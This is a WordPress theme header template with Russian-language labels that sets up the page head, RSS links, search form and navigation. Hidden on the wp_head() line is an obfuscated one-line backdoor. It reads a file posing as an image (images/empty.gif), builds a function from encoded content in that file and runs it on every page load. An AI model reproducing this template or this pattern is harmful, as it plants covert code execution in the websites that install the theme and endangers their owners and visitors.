<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Архив сайта <?php } ?> <?php wp_title(); ?></title>
<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="text/xml" title="RSS .92" href="<?php bloginfo('rss_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php wp_get_archives('type=monthly&format=link'); ?>
<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
</head>

<body>

<div id="wrap">
  <div id="content-container">

<div id="header">

		<h1><a href="<?php bloginfo('url'); ?>/"><?php bloginfo('name'); ?></a></h1>
		<div id="subtitle"><?php bloginfo('description'); ?></div>
<div id="rss">
<a href="<?php bloginfo('rss2_url'); ?>">
	<img src="<?php echo bloginfo('template_directory');?>/images/rss.gif">
	</a>
</div>
		<div id="menu_search_box">
		<form method="get" id="searchform" style="display:inline;" action="<?php bloginfo('home'); ?>/">
			<div class="alignleft">Поиск: </div>
			<div class="alignright"><input type="text" class="s" value="<?php echo wp_specialchars($s, 1); ?>" name="s" id="s" />&nbsp;</div>
			</form>
		</div>
</div>

<div id="navlist-container">
			<div id="navlist">
			<ul>
		<?php if (is_page()) { $highlight = "page_item"; } else {$highlight = "page_item current_page_item"; } ?>
			<li class="<?php echo $highlight; ?>"><a href="<?php bloginfo('url'); ?>">Главная</a></li>
			<?php wp_list_pages('sort_column=menu_order&depth=1&title_li='); ?>
		</ul>
	</div>
	</div>